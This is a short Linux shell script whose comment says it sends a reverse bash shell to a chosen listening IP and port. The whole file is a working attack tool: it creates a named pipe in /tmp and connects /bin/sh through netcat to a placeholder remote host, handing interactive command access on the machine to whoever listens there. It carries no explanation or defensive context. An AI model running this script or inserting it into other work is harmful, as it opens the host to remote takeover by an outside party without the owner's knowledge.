#!/bin/sh
# This is a Linux shell script to reverse bash shell to a specific listenning IP and port. 

r_num=$(date +%s);
backpipe="backpipe""$r_num";

mknod /tmp/$backpipe p;
/bin/sh 0</tmp/$backpipe | nc [Listen IP] [Listen Port] 1>/tmp/$backpipe;

